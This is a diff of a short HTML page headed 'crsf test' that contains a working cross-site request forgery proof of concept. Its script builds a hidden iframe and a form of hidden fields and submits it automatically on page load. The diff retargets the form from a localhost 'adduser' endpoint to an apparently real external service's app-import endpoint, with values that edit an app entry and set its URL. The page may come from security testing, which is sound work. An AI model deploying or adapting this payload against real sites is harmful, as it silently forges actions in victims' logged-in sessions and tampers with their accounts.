@@ -1,14 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
 	<meta charset=utf-8>
 </head>
-
 <body>
 	<h2>crsf test</h2>
-
-
 	<script type="text/javascript">
 
      var iframe = document.createElement("iframe");
@@ -19,15 +15,20 @@
     // construct a form with hidden inputs, targeting the iframe
     var form = document.createElement("form");
     form.target = uniqueString;
-    form.action = "http://localhost:6008/service/user/adduser";
+    form.action = "http://xxzx.xxx.cn/services/app/importthirdapp";
     form.method = "POST";
-    form.innerHTML=`<input type="text" name="companyid" value="be_eEZR2V3Fh">
-                                        <input type="text" name="usertype" value="0">
-                                        <input type="text" name="cnlid" value="0002">
-                                        <input type="text" name="username" value="111">
-                                        <input type="text" name="mobile" value="18112111111">`
+    form.innerHTML=`
+    <input type="text" name="companyid" value="be_eEZR2V3Fh">
+                                        <input type="text" name="act" value="edit">
+                                        <input type="text" name="id" value="85819fc2-ebaf-49c6-ab29-a4a41a0ed856">
+                                        <input type="text" name="name" value="crsf test 3">
+                                        <input type="text" name="pictureurl" value="http://7xq2xq.com2.z0.glb.qiniucdn.com/d5853ee5-5540-4a26-a5c5-d4ac78b72d70-6678">
+                                        <input type="text" name="state" value="">
+                                        <input type="text" name="url" value="http://ent.killerwhale.cn/i/eyzbEBY3C">
+                                        <input type="text" name="zbmyappid" value="aiFBQ27YT">
+                                        
+                                        `
     form.submit();
 </script>
 </body>
-
 </html>
